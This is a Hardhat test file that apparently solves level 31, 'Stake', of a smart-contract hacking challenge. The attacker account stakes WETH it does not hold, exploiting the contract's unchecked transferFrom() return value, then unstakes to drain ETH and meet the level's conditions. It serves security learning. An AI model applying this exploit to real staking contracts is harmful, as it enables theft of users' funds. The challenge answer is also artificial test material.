import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";
import hre from "hardhat";

import { Stake, StakeFactory, StakeFactory__factory, Stake__factory } from "../typechain-types";
import { ERC20, ERC20__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("31. Stake", function () {
  let context: FixtureContext;
  let level: FixtureLevel<StakeFactory, Stake>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, StakeFactory__factory, (address, signer) =>
      Stake__factory.connect(address, signer),
    );
  });

  it("should be attacked successfully", async function () {
    const amt = hre.ethers.parseEther("0.0011");

    // get WETH instance
    const wethAddr = await level.instance.WETH();
    const weth: ERC20 = ERC20__factory.connect(wethAddr, context.player);

    // good staker stakes some ETH
    let tx = await level.instance.connect(context.owner).StakeETH({ value: amt + 1n });
    await tx.wait();

    // attacker stake WETH, exploit bug in function (it does not check transferFrom() return value)
    // then unstakes
    tx = await weth.approve(level.instance, amt);
    await tx.wait();
    tx = await level.instance.connect(context.player).StakeWETH(amt);
    await tx.wait();
    tx = await level.instance.Unstake(amt);
    await tx.wait();

    // the Stake contract's ETH balance has to be greater than 0.
    const levelBalance = await hre.ethers.provider.getBalance(level.instance);
    expect(levelBalance).to.be.greaterThan(0);

    // totalStaked must be greater than the Stake contract's ETH balance
    const totalStaked = await level.instance.totalStaked();
    expect(totalStaked).to.be.greaterThan(levelBalance);

    // you must be a staker.
    expect(await level.instance.Stakers(context.player)).to.be.true;

    // your staked balance must be 0
    const attackerStake = await level.instance.UserStake(context.player);
    expect(attackerStake).to.be.eq(0);

    await completeLevel(context, level);
  });
});
